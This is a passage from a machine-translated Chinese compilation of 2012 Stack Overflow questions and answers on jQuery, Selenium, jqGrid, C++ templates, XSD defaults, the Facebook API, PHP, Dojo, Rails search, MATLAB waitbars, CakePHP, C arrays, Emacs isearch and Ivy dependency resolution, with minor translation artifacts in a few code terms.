我找到了一些用于显示具有幻灯片效果的内容的 jQuery 代码，但它们都不起作用。

Javascript 代码：

```
 $('#clickme').click(function() {
        $('#pic').slideToggle('slow', function() {
        });
    }); 
```

的HTML：

```
<div id="clickme">
        click here</div>
    <img id="pic" src="Img/Gallery/123.jpg" /> 
```

当我单击“单击我” div 时，没有任何反应。我也试过这个：

```
$("div").click(function () {
  $(this).hide("slide", { direction: "down" }, 1000);
}); 
```

但同样，什么也没有发生。问题是什么？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:31:01.207

把你的代码放进去

```
 $(document).ready(function(){
    // Your code here    
 }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:31:16.797

您应该通过在以下位置添加此行来加载 jQuery `head`：

```
<script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.2.min.js"></script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:33:32.850

您可能还想将代码更改为：

```
 $("div").on("click", function () {
        $(this).hide("slide", { direction: "down" }, 1000);
   }); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:34:36.867

检查此[jsfiddle](http://jsfiddle.net/CT3qX/)以查看工作示例。）顺便说一句，我想没有必要将空函数传递给slideToggle。

我想唯一的区别是你尝试运行你的javascript而不是`onload`函数；它没有找到任何“clickme”元素，这就是不调用事件处理函数的原因。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T14:37:50.237

它有两种工作方式：

1）在标题中添加以下代码

```
$(document).ready(function () {
$("div").click(function () {
$('#pic').slideToggle('slow', function() {
    });
});
}); 
```

2）将您的代码放在最后一个 div**之后！**

显然你必须包含一个 jquery 文件！例如：

```
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script> 
```

# c# - 阅读浏览器在 C# webdriver 中导航网页时发出的请求和响应

> ID：11052642
> 
> 赞同：0
> 
> 时间：2012-06-15T14:27:59.447
> 
> 标签：c#, selenium, webdriver

我想阅读浏览器在页面上导航时发出的所有请求和响应。

例如：如果我导航到[http://www.yahoo.com](http://www.yahoo.com)，那么我们观察到浏览器正在发出大量 GET 和 post 请求。用于图像加载、内容加载和显示广告（广告）。

我正在使用 selenium web 驱动程序和 C#。

你能帮我如何获得所有请求（获取/发布）和响应。

谢谢， Ramesh Jhajharia

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:12:33.760

完成此任务的最佳方法是使用某种可编写脚本的代理。一个这样的代理是[BrowserMob 代理](https://github.com/webmetrics/browsermob-proxy)，甚至还有一个[.NET 包装器](https://github.com/AutomatedTester/AutomatedTester.BrowserMob)。这将允许您收集 WebDriver 范围之外的信息，例如您要求的原始 HTTP 请求。

# jquery - 带有editUrl的JqGrid InlineEdit：'clientArray'无法保存

> ID：11052643
> 
> 赞同：0
> 
> 时间：2012-06-15T14:28:03.203
> 
> 标签：jquery, asp.net-mvc, jqgrid

我正在尝试编辑网格数据并将其保存到网格本身以供以后发布。

但是，当我在编辑要保存的行后按 Enter 键时，我会在以下位置`jquery1.4.2.min.js`说“**无效参数**”时出现 javascript 错误。

```
if(x){e.username?x.open(n,e.url,e.async,e.username,e.password):x.open(n,e.url,e.async); 
```

我正在使用带有 VS2008 的 Asp.net MVC2

这是我的 JS

```
$(function() {
    pageloadButtons();
    $('.auto').autoNumeric();
    var lastsel2;
    // $('.alphanumerich').lettersonly();
    jQuery('#jgrid').jqGrid({
        autowidth: true,
        altRows: true,
        altclass: 'grdAltRwClr',
        datatype: 'xml',
        forceFit: true,
        gridview: true,
        mtype: 'post',
        height: 190,
        rowNum: 0,
        postData: { offid: function() { return $('#p_offid').val(); },
            calendarid: function() { return $('#p_calendarid').val(); }
        },
        url: window.rootPath + 'AttBulkEntry/JGridData',
        editUrl: 'clientArray',
        cellSubmit: 'clientArray',
        beforeSelectRow: function() { return true; },
        onSelectRow: function(id) {
        if (id && id !== lastsel2) {
            jQuery("#jgrid").saveRow(lastsel2, false, 'clientArray');
                //jQuery('#jgrid').jqGrid('saveRow', lastsel2, function() { alert('saved'); }, 'clientArray');
                jQuery('#jgrid').editRow(id, true);
                lastsel2 = id;
            }
        },
        gridComplete: function() {
            GridComplete();
        },
        colModel: [
              { name: 'act', label: 'View', resizable: false, search: false, sortable: false, title: false, width: 6, index: 'act' }
            , { name: 'attndid', label: 'Attendance ID', width: 15, index: 'attndid' }
            , { name: 'emphistid', label: 'Emp.Hist.ID', width: 22, index: 'emphistid' }
            , { name: 'ename', label: 'Employee Name', width: 20, index: 'ename' }
            , { name: 'paymonth', label: 'Pay Month', width: 12, index: 'paymonth' }
            , { name: 'absent', label: 'Absence', width: 10, index: 'absent', editable: true, edittype: 'text' }
            , { name: 'sanctioned', label: 'Sanctioned', width: 15, index: 'sanctioned', editable: true, edittype: 'text' }
            , { name: 'EL', label: 'EL', width: 5, index: 'EL', editable: true, edittype: 'text' }

            ]

    });

}); 
```

难道我做错了什么 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:37:39.533

“editUrl”参数的正确名称：`editurl`.

# c++ - C++ 模板错误：没有匹配的调用函数

> ID：11052644
> 
> 赞同：-4
> 
> 时间：2012-06-15T14:28:03.407
> 
> 标签：c++, templates, vector

我收到这里提到的错误： [C++ Templates Error: no matching function for call std::vector<int, std::allocator<int> >](https://stackoverflow.com/questions/11052027/c-templates-error-no-matching-function-for-call-stdvectorint-stdallocat)

这是错误（再次）：

```
main.cpp: In function ‘int main()’:
main.cpp:21:21: error: no matching function for call to ‘Test<int>::foo(std::vector<int, std::allocator<int> >)’
main.cpp:21:21: note: candidate is:
main.cpp:14:6: note: void Test<T>::foo(std::vector<T>&) [with T = int]
main.cpp:14:6: note:   no known conversion for argument 1 from ‘std::vector<int, std::allocator<int> >’ to ‘std::vector<int, std::allocator<int> >&’ 
```

问题是我有一个更复杂的情况，我不知道如何解决它（不破坏太多代码）。我有一个通用的二叉搜索树类。我想用来自二叉搜索树节点的所有值填充类型为 T(generic) 的元素的向量 - 所以我不能将向量设为 const。遍历树的函数是递归的。

所以我有：

```
/*main*/

BST<int> t;

t.add(21);
t.add(12);
//.... etc.

vector<int> elements;

t.inorder(elements);
/* ------------ */ 
```

和：

```
/*BST.h*/
template<typename T>
class BST{
    //....
    Node<T>* root;
    //....
    void inorder_rec(Node<T>* root, vector<T>& result);
    void inorder(vector<T>& result);
    //....
};

template<typename T>
void BST<T>::inorder_rec(Node<T>* root, vector<T>& result){
    // recursive call for the child nodes
}

void BST<T>::inorder(vector<T>& result){
    inorder_rec(this->root, result);
}
/* ------------ */ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:30:59.467

您正在尝试调用一个带有临时引用的函数。临时只能绑定到对 const 的引用。此外，明智的做法是显示错误的实际来源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:35:56.617

这是您的实际代码吗？inorder 和 inorder_rec 的定义需要有返回类型。否则，这部分代码看起来很好，暂时看不到：

```
vector<int> elements;
t.inorder(elements); 
```

愚蠢的问题，但是您是否保存了文件？还是这个错误来自代码的不同部分？

# c# - C# XmlDocument 未使用各自的 XSD 默认属性进行更新

> ID：11052651
> 
> 赞同：0
> 
> 时间：2012-06-15T14:28:24.257
> 
> 标签：c#, xml, xsd, default

这是来自 xsd 和 xml 的示例

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<config test2="true">
</config> 
```

XSD

```
<?xml version="1.0" encoding="utf-8"?>   
<xs:schema  targetNamespace="rules.xsd" xmlns="rules.xsd" elementFormDefault="qualified"  xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msprop="urn:schemas-microsoft-com:xml-msprop">
  <xs:element name="config">
    <xs:complexType>
      <xs:attribute name="test1" type="xs:boolean" default="false" />
      <xs:attribute name="test2" type="xs:string" default="mary123" />
    </xs:complexType>
  </xs:element>
</xs:schema> 
```

我可以使用此 xsd 使用此代码块在 C# 中验证此 xml

```
XmlDocument doc = new XmlDocument();
XmlTextReader schemaReader = new XmlTextReader(System.IO.Path.GetFullPath("Mi_XSD_here.xsd"));
XmlSchema schema = XmlSchema.Read(schemaReader, ValidationCallBack);
doc.Schemas.Add(schema);
doc.Load("Mi_XML_here.xml");
doc.Validate(ValidationCallBack); 
```

问题是：我在 xsd 中有两个默认属性，但是当我运行此代码时，他没有在 XmlDocument 中插入属性，结果与我传递给系统的 xml 相同。

默认属性不起作用，我不知道为什么它们不起作用，我相信存在其他形式来解决这个问题，我确实找到了这个但没有起作用

[Extensions.Validate 方法](http://msdn.microsoft.com/en-us/library/bb354954.aspx)

obs：ValidationCallBack 是一些我认为与问题无关的错误函数返回

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T16:51:31.333

您的架构的目标命名空间是 rules.xsd，因此您的 xml 文件需要包含它以针对架构进行验证。另外我假设 teste2 是一个错字（因为它不符合架构），你的意思是 test2：

```
<config test2="" xmlns="rules.xsd" /> 
```

在这种情况下，只有 test1 将添加默认值，因为 test2 已设置为空字符串。

# facebook - Facebook：朋友对通过 api 完成的页面上的帖子的喜欢在朋友的提要中不可见

> ID：11052654
> 
> 赞同：1
> 
> 时间：2012-06-15T14:28:44.453
> 
> 标签：facebook, facebook-graph-api, facebook-like

当以管理员身份手动发布到页面时，所有朋友对这些帖子的喜欢都会出现在他们的提要中。

**但是当通过graph api发帖到同一页面时，朋友对这些帖子的点赞不会出现在他们的feed**中。

在使用以下范围时...

```
'scope' => 'read_stream,publish_stream,manage_pages' 
```

...并通过我/帐户检索 access_token，我的帖子包含此信息...

```
'name',
'message',
'link',
'caption',
'description',
'picture',
'access_token' 
```

此外，我尝试在帖子中添加定位值...

```
'targeting' => array('value' => 'EVERYONE'), 
```

... 或者

```
'privacy' => array('value' => 'EVERYONE'), 
```

...尽管后者无论如何都不被接受，但两者都对这个问题没有影响。

**我注意到手动发布到页面的“1 分钟前”旁边有一个小地球图标......而 api 发布到页面没有。**

这是 Facebook 设置的限制，可能是隐私设置，还是我做错了什么？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T16:32:50.023

您是在谈论人们与他们的帖子互动时页面管理员看到的 Facebook 通知吗？这些不适用于通过 API 发布的帖子

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T12:28:01.660

似乎是 Facebook 的错误：

[http://developers.facebook.com/bugs/154484061346461](http://developers.facebook.com/bugs/154484061346461)

# php - PHP：从文本文件中获取行

> ID：11052655
> 
> 赞同：-2
> 
> 时间：2012-06-15T14:28:51.147
> 
> 标签：php

**编辑：**自从发布这个问题以来，我学到了很多东西，所以我已经为任何类似询问的人重写了它。

我正在尝试通过 HTTP GET 请求从文本文件末尾加载指定数量的行，该请求将被发送到 PHP 文件。这可以做到`file_get_contents()`吗？

该函数`file_get_contents()`还将整个文件读入内存。有什么比将整个文件读取到数组，然后删除指定数量的行更有效的解决方案？

例如，如果我有一个 12000 行的文本文件，我将如何读取 4025-6042 之间的行范围？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:31:12.110

您将使用[`file()`](http://us.php.net/manual/en/function.file.php)将文件作为数组获取。然后[`array_slice()`](http://us2.php.net/array_slice)修剪数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:31:30.590

为此[，](http://php.net/manual/en/function.file-get-contents.php)您可以在其中指定 an`offset`和 a`maxlength`以`file_get_contents`指定要读取的文件量。

> 此函数类似于 file()，不同之处在于 file_get_contents() 以字符串形式返回文件，**从指定的偏移量开始直到 maxlen 字节。**

# dojo - 如何在 Dojo 1.7 中重新加载 FilteringSelect？

> ID：11052656
> 
> 赞同：1
> 
> 时间：2012-06-15T14:28:51.563
> 
> 标签：dojo, reload, datastore, dijit.form

我使用以下代码创建了一个 FilteringSelect：

```
 var type = $('fMatlTypeId').value;

    var eSelect, dataStore;
    require([
        "dijit/form/FilteringSelect",
        "dojo/store/Memory",
        "dojo/data/ObjectStore",
        "dojo/_base/xhr",
        "dojo/parser",
        "dojo/domReady!"
    ], function(FilteringSelect, Memory, ObjectStore, xhr){
        xhr.get({
            url: 'adminservices/admin/materialType/assignedFacilities/' + type + '/',
            handleAs: "json"
        }).then(function(data){
            dataStore =  new ObjectStore({ objectStore:new Memory({ data: data.items }) });

            eSelect = new FilteringSelect({
                id: 'fMatlTypeFacilities',
                store: dataStore, 
                searchAttr: 'nameStatus',
                queryExpr: '*${0}*',
                ignoreCase: true,
                autoComplete: false,
                style: 'width:200px',
                required: true
            }, document.createElement('div'));

            // Append to the div
            $('FS_MatlTypeFacilities').innerHTML = '';
           dojo.byId("FS_MatlTypeFacilities").appendChild(eSelect.domNode);

            eSelect.startup();

            eSelect.setValue(dataStore.objectStore.data[0].id);
        });
    }); 
```

现在，如果后端的数据发生变化，我该如何重新加载它？

我尝试了以下代码，当我在 Firebug 中调试它时，商店会更新，但 FilteringSelect 不会。

```
 var eSelect, dataStore;
    require([
        "dijit/form/FilteringSelect",
        "dojo/store/Memory",
        "dojo/data/ObjectStore",
        "dojo/_base/xhr",
        "dojo/parser",
        "dojo/domReady!"
    ], function(FilteringSelect, Memory, ObjectStore, xhr){
        xhr.get({
            url: 'adminservices/admin/materialType/assignedFacilities/' + type + '/',
            handleAs: "json"
        }).then(function(data){
            dataStore =  new ObjectStore({ objectStore:new Memory({ data: data.items }) });
            dataStore.fetch();

            eSelect = dijit.byId('fMatlTypeFacilities');
            eSelect.store.close();
            eSelect.store = dataStore;
            eSelect.startup();
         });
     }); 
```

有什么建议么？

我发现唯一可行的方法就是每次都销毁小部件并让它重建。所以我在上面的创建代码之前添加了以下代码。但是必须有一种方法可以简单地重新加载它。

```
if (dijit.byId('fMatlTypeFacilities')) dijit.byId('fMatlTypeFacilities').destroy(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-25T18:23:02.083

尝试改变：

```
eSelect.store = dataStore; 
```

至

```
eSelect.set('store', dataStore); 
```

通常，您应该通过 myDijit.set(''); 访问 dijit 的属性。请参阅[此处](https://stackoverflow.com/questions/735384/how-do-use-dojo-textbox-attr-function-to-get-value)了解更多详细信息

# ruby-on-rails - 我需要一个非常简单的搜索 gem 来搜索 sqlight3 数据库上的派对名称吗？

> ID：11052658
> 
> 赞同：0
> 
> 时间：2012-06-15T14:28:54.547
> 
> 标签：ruby-on-rails, database, search, gem

我的派对注册 Rails 3 应用程序需要一个搜索功能，供访问者搜索派对名称，然后能够点击派对并转到该派对的显示页面。必须是非常简单的 ajax 列表，无需重新加载等即可弹出。

该应用程序几乎完成并运行 sqlight3 数据库。

任何建议 - 尝试了所有 RailsCasts 的建议，但没有任何建议 100% 适合。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:07:42.303

我想你想要两种不同的东西。

1）要创建一个简单的搜索，你可以做这样的[事情](http://railscasts.com/episodes/37-simple-search-form)。

2) 要在键入时自动完成（例如派对名称），您可以使用[自动完成](https://github.com/crowdint/rails3-jquery-autocomplete)gem。

您必须决定要遵循哪种方法......

我希望如果能以某种方式帮助...

**编辑**- 展示如何实现简单搜索。

假设你有一个模型叫做`Party`

您的表格（例如索引页）：

```
...
<%= form_tag parties_path, method: :get do %>
  <%= text_field_tag :search, params[:search] %>
  <%= submit_tag "Search", name: nil %>
<% end %>
...

#display results
<% @parties.each do |party| %>
...
<% end %> 
```

模范党：

```
...
def self.search(search)
  # if search is not empty
  if search
    find(:all, :conditions => ["partyname LIKE ?", "%#{search}%"])
  # if search is empty return all
  else
    find(:all)
  end
end
... 
```

控制party_controller：

```
@parties = Party.search(params[:search]) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T11:37:04.883

试试 smart_search gem

```
gem install smart_search 
```

做所有需要做的事情以使您的模型可搜索！

# matlab - MATLAB 更新等待栏

> ID：11052661
> 
> 赞同：0
> 
> 时间：2012-06-15T14:28:59.243
> 
> 标签：matlab, user-interface, progress-bar

我正在尝试使用 waitbar 函数在 MATLAB 程序中实现“完成百分比”栏。但是，我遇到了麻烦。这是我目前拥有的代码：

* * *

在我的 GUI 中

```
POSITION = [53.3333 20 188.5446 20];   
H = uiwaitbar(POSITION); 
for percentageDone = 0;
   uiwaitbar(H,percentageDone);
end 
```

* * *

然后

```
function h = uiwaitbar(varargin)

if ishandle(varargin{1}) 
    ax = varargin{1}; 
    value = varargin{2}; 
    p = get(ax,'Child'); 
    x(3:4) = value; 
    set(p,'XData',x) 
    return 
end 

pos = varargin{1}; 
bg_color = [1 1 1]; 
fg_color = [0 .5 0]; 
h = axes('Units','pixels',... 
    'Position',pos,... 
    'XLim',[0 100],'YLim',[0 1],... 
    'XTick',[],'YTick',[],... 
    'Color',bg_color,... 
    'XColor',bg_color,'YColor',bg_color); 
patch([0 0 0 0],[0 1 1 0],fg_color,... 
    'Parent',h,... 
    'EdgeColor','none',... 
    'EraseMode','none'); 

end 
```

在脚本的其他地方，我有一个 KeyPressFcn 回调，用户在其中输入问题的答案。在此回调结束时，对于每个正确答案，我希望等待栏填满一点。但是，无论我为 percentDone 变量分配什么值，GUI 中的等待栏都不会发生任何变化。

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:10:12.840

您可能只是`drawnow`在设置 XData 属性后错过了一个调用，以强制刷新图形事件队列。如果这不能解决您的问题，请包含足够的代码来重现症状。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-16T22:01:02.147

我很困惑，你说你正在使用内置函数 WAITBAR，但是你似乎正在自己实现一个..

无论如何，这是一个显示自定义进度条的相当无用的示例。一直按“下一步” :)

```
function progressBarDemo()
    %# a figure and a plot area
    hFig = figure('Menubar','none');
    hAxPlot = axes('Parent',hFig, 'Box','on', ...
        'Units','normalized', 'Position',[0.1 0.2 0.8 0.6]);
    hLine = line('Parent',hAxPlot, 'XData',1:1000, 'YData',nan(1,1000), ...
        'Color','b');

    %# next button
    uicontrol('Style','pushbutton', 'String','next', ...
        'Callback',@buttonCallback);

    %# progress bar axis
    x = linspace(0, 1, 13+1);            %# steps
    hAx = axes('Parent',hFig, 'XLim',[0 1], 'YLim',[0 1], ...
        'XTick',[], 'YTick',[], 'Box','on', 'Layer','top', ...
        'Units','normalized', 'Position',[0 0.9 1 0.1]);
    hPatch = patch([0 0 x(1) x(1)], [0 1 1 0], 'r', 'Parent',hAx, ...
        'FaceColor','r', 'EdgeColor','none');
    hText = text(0.5, 0.5, sprintf('%.0f%%',x(1)*100), ...
        'Parent',hAx, 'Color','w', 'BackgroundColor',[.9 .5 .5], ...
        'HorizontalAlign','center', 'VerticalAlign','middle', ...
        'FontSize',16, 'FontWeight','bold');
    counter = 2;

    %# next button callback function
    function buttonCallback(src,evt)
        %# draw another random plot
        set(hLine, 'YData',cumsum(rand(1000,1)-0.5))

        %# update progress bar
        set(hPatch, 'XData',[0 0 x(counter) x(counter)])
        set(hText, 'String',sprintf('%.0f%%',x(counter)*100))

        %# terminate if we have reached 100%
        counter = counter + 1;
        if counter > numel(x)
            set(src, 'Enable','off', 'String','Done')
            return
        end
    end
end 
```

![截屏](../Images/dbdae5235d9ead1e4336029c8c3aecdb.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T16:21:31.813

你首先创建`waitbar`? 像这样的东西：

```
h = waitbar(0, '1', 'Name', 'My progress bar', 'CreateCancelBtn', 'setappdata(gcbf, ''canceling'', 1)'); 
```

之后，更新等待栏：

**编辑：修复了文本输出的错误：** `percentageDone` **必须乘以 100。**

```
waitbar(percentageDone, h, sprintf('Already %d percent ready!', 100*percentageDone)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T16:04:34.503

您是否尝试过使用File Exchange 中的[Progressbar ？](http://www.mathworks.com/matlabcentral/fileexchange/6922-progressbar)它可能会为您节省很多麻烦。我一直有很好的结果。

# cakephp - cakephp beforeSave 闪信

> ID：11052676
> 
> 赞同：1
> 
> 时间：2012-06-15T14:29:45.043
> 
> 标签：cakephp, cakephp-2.0

有没有办法在 beforeSave 函数中从模型中设置 flash 消息或错误消息，并在视图中读取错误/消息。而且我不是在谈论验证错误。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T19:37:04.523

这些方面的东西应该与手头可用的信息一起使用：

```
<?php
class AppModel extends Model {

    public $lastErrorMessage;

    public function beforeSave(...) {
        $this->lastErrorMessage = null;
        return true;
    }

}

<?php
class MyModel Extends AppModel {

    public function beforeSave(...) {
        parent::beforeSave(..);
        if (error) {
            $this->lastErrorMessage = 'Some error message';
            return false;
        }
        return true;
    }
}

<?php
class MyController extends AppController {

    public function action() {
        if ($this->MyModel->save($this->request->data)) {
        } else {
            $message = "Some default message";
            if ($this->MyModel->lastErrorMessage) {
                $message = $this->MyModel->lastErrorMessage;
            }
            $this->Session->setFlash($message);
        }
    }
} 
```

# c - C中的数组大小

> ID：11052677
> 
> 赞同：2
> 
> 时间：2012-06-15T14:29:47.703
> 
> 标签：c, multidimensional-array

我在 C 中声明了一个多维数组，如下所示：

```
int arr[4][2];
int length = 0; 
```

但我显然可以添加任意数量的元素：

```
void addStuff(){
    arr[length][0] = someVal;
    arr[length++][1] = someVal;
} 
```

它不会给出任何错误。这是否意味着我在无人区某处破坏了我的记忆？或者这是 CI 不知道的某些功能？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-15T14:31:39.233

如果您分配超过数组大小，那么您肯定会在某处损坏内存 - 程序可能会出现段错误，或者其他数据可能会损坏，或者它可能（意外）行为正确。默认情况下，C 中没有边界检查。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:32:40.480

你肯定会破坏一些内存。在执行程序时，它会给你一个名为“[未定义行为”的奇妙错误。](http://en.wikipedia.org/wiki/Undefined_behavior)

在 C 中，作为程序员，您有责任确保不会发生超出范围的数组写入。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:33:07.373

C 没有任何数组边界检查。所以是的，你在某处操纵记忆。如果你很幸运，那将立即导致你的程序崩溃。如果你不走运，你正在操纵一些有效数据，导致一段时间后崩溃，你的程序像以前一样工作，或者你的硬盘被格式化。

# search - Emacs：结合iseach-forward和recenter-top-bottom

> ID：11052678
> 
> 赞同：10
> 
> 时间：2012-06-15T14:29:48.427
> 
> 标签：search, emacs

非常感谢您的帮助。

在 Emacs 中，我喜欢使用 iseach-forward (Cs)，但如果突出显示的字体单词位于屏幕中间而不是最底部，我会更喜欢它。

我发现自己不断地这样做：

Cs foo Cs Cs Cs...哦！这就是我要找的'foo'！氯

有没有办法让搜索结果在屏幕中间居中？

干杯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T15:08:57.270

最好的方法可能是添加以下钩子：

```
(add-hook 'isearch-mode-end-hook 'recenter-top-bottom) 
```

这将`recenter-top-bottom`在每次成功的增量搜索完成时执行该命令。

编辑：我进行了一些调查，在重复搜索相同字符串时执行的函数（即，连续输入`C-s`或`C-r`在主动搜索期间）似乎是`isearch-repeat-forward`and/or `isearch-repeat-backward`。因此，如果您还希望在每次重复时重新定位，除了定义上述钩子之外，您还需要建议所述函数，如下所示：

```
(defadvice
  isearch-repeat-forward
  (after isearch-repeat-forward-recenter activate)
  (recenter-top-bottom))

(defadvice
  isearch-repeat-backward
  (after isearch-repeat-backward-recenter activate)
  (recenter-top-bottom))

(ad-activate 'isearch-repeat-forward)
(ad-activate 'isearch-repeat-backward) 
```

就个人而言，我发现由此产生的行为非常令人讨厌和迷失方向，但*de gustibus non est disputandum*。也许`recenter-top-bottom`在初始时保留使用`isearch-mode-end-hook`并`recenter`在对函数的建议中单独使用`repeat`会不那么令人讨厌。

Advising`isearch-forward`本身就相当于添加了我上面最初建议的钩子，并且似乎对重复搜索没有影响。添加钩子更简单，我认为更惯用，所以它可能比建议函数更受欢迎。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-20T16:24:40.910

谢谢尼古拉斯和格雷格。

您的建议为我指明了正确的方向。这是完成我所要求的代码：

```
(defadvice
    evil-search-forward
    (after evil-search-forward-recenter activate)
    (recenter))
(ad-activate 'evil-search-forward)

(defadvice
    evil-search-next
    (after evil-search-next-recenter activate)
    (recenter))
(ad-activate 'evil-search-next)

(defadvice
    evil-search-previous
    (after evil-search-previous-recenter activate)
    (recenter))
(ad-activate 'evil-search-previous) 
```

解释：

我不想让事情变得更复杂，添加我使用 Evil（Emacs 中的 vim 模式），所以我在我的问题中省略了这一点。

我使用 defadvice 向前搜索，移动到下一个搜索项目并移动到上一个搜索项目。

值得一提的是，我没有使用 (recenter-top-bottom) 功能。这种行为很疯狂，因为它将第一个搜索项目置于屏幕中间，将第二个置于顶部，将第三个置于底部。我只是使用“recenter”功能将其始终居中于屏幕中间。

对于非 Evil 用户，代码如下所示：（未测试！）

```
(defadvice
    isearch-forward
    (after isearch-forward-recenter activate)
    (recenter))
(ad-activate 'isearch-forward)

(defadvice
    isearch-repeat-forward
    (after isearch-repeat-forward-recenter activate)
    (recenter))
(ad-activate 'isearch-repeat-forward)

(defadvice
    isearch-repeat-backward
    (after isearch-repeat-backward-recenter activate)
    (recenter))
(ad-activate 'isearch-repeat-backward) 
```

干杯!

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T15:07:36.397

您可以`defadvice`使用`recenter-top-bottom`.`isearch-forward`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-05-09T02:17:17.783

对于像我这样想要配置他们的 spacemacs 的其他人来说，@RafaelGP 的回答对我有用，只是稍作修改：所有邪恶的功能都包含`-ex-`在其中，如下所示：

```
 (defadvice
      evil-ex-search-forward
      (after evil-search-forward-recenter activate)
    (recenter))
  (ad-activate 'evil-ex-search-forward)

  (defadvice
      evil-ex-search-next
      (after evil-search-next-recenter activate)
    (recenter))
  (ad-activate 'evil-ex-search-next)

  (defadvice
      evil-ex-search-previous
      (after evil-search-previous-recenter activate)
    (recenter))
  (ad-activate 'evil-ex-search-previous) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-02-18T09:57:49.503

设置`scroll-margin`为一个很大的值（使其大于最大可能窗口高度的一半），比如 250，`maximum-scroll-margin`设置为 0.5 可以达到预期的效果。两者都可以在自定义组“Windows”中找到。

但是，这显然不仅仅影响isearch。因此，在实践中，您可能希望设置更合理的值，例如 10 和 0.25。这近似于重新定位，但对于一般滚动来说并不太尴尬。

# ivy - 在 Ivy 中定义“latest.integration”的行为

> ID：11052681
> 
> 赞同：2
> 
> 时间：2012-06-15T14:29:59.633
> 
> 标签：ivy, dependency-management

我无法理解 latest.integration 的工作原理。

我有一个没有给出输出的例子： http: [//ant.apache.org/ivy/history/latest-milestone/tutorial/defaultconf.html](http://ant.apache.org/ivy/history/latest-milestone/tutorial/defaultconf.html)

也就是说，无论发布时间如何，本地解析器都优先于其他解析器。

我的 ivysettings.xml 是这样的：

```
<resolvers>
<chain name="download-chain" returnFirst="false" >
    <url name="nexus-repo" m2compatible="true" >
        <artifact pattern="${nexus}/[organization]/[module]/[revision]/[type]s/[artifact](-[classifier]).[ext]" />
        <ivy pattern="${nexus}/[organisation]/[module]/[revision]/[type]s/[artifact].[ext]" />
    </url>
    <resolver ref="local" />
</chain>
</resolvers> 
```

在这里我声明我有一个 nexus url 存储库和一个对默认本地的引用。当我想解决我的依赖关系时，我使用这个链。

我构建指定的工件并将其发布到本地，状态为“集成”，修订版为“HEAD”（对我们来说类似于 SNAPSHOT），首先使用本地解析器：

```
<ivy:publish 
    overwrite="yes"
    update="true"
    artifactspattern="${project.dist.dir}/[artifact]-[revision](-[classifier]).[ext]" 
    resolver="local"
    settingsRef="ivy.nexus"
/> 
```

并再次重建它并将其发布到 nexus 存储库：

```
<ivy:publish 
    overwrite="yes"
    update="true"
    artifactspattern="${project.dist.dir}/[artifact]-[revision](-[classifier]).[ext]" 
    resolver="publish-url"
    forcedeliver="true"
    settingsRef="ivy.nexus"
/> 
```

我有另一个项目，它将以前的工件声明为具有修订版“latest.integration”的依赖项。

我希望无论声明的解析器的顺序如何，都应该从本地存储库下载工件。但事实并非如此。下载的工件始终是首先提到的解析器。更改“本地”解析器的名称没有任何影响。顺序永远是最重要的。

我尝试将 changed="true" 附加到我的依赖项中。它没有帮助。

在这个问题中： [Ivy: Forcing local snapshot for dependency](https://stackoverflow.com/questions/7023302/ivy-forcing-local-snapshot-for-dependency)

提问者提到了一个甚至不同的行为，即最新的被拾取（解析器的顺序甚至无关紧要）。

所以总结一下并抱歉延长：如何获得神器：

1) 无论位置如何，始终是 latest.integration （最新的）。

2) 始终来自本地，即使其他位置有更新的集成版本。

3）我就那么无知吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:54:53.630

我建议阅读以下关于将工件发布到 Nexus 的答案

[如何使用 ivy 和 nexus 发布 3rdparty 工件](https://stackoverflow.com/questions/5111831/how-to-publish-3rdparty-artifacts-with-ivy-and-nexus/5115447#5115447)

使用[ibiblio](http://ant.apache.org/ivy/history/latest-milestone/resolver/ibiblio.html)解析器，它更简单。

第二条建议是在您的 ANT 逻辑中明确区分集成和发布版本。前者可以使用时间戳作为修订，而后者需要有一个策略来维护递增的修订号（这是一个完全不同的问题）。Maven 将这些称为“SNAPSHOT”或“Release”构建并实现了两种不同类型的存储库来支持它们。

最后一条建议是避免使用本地存储库，除非您决定存储集成构建。常春藤维护下载工件的本地缓存，很少值得付出努力或维护本地存储库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T17:41:16.923

毕竟，我可以设法使订单微不足道。

我不确定我应该走多远，但是：

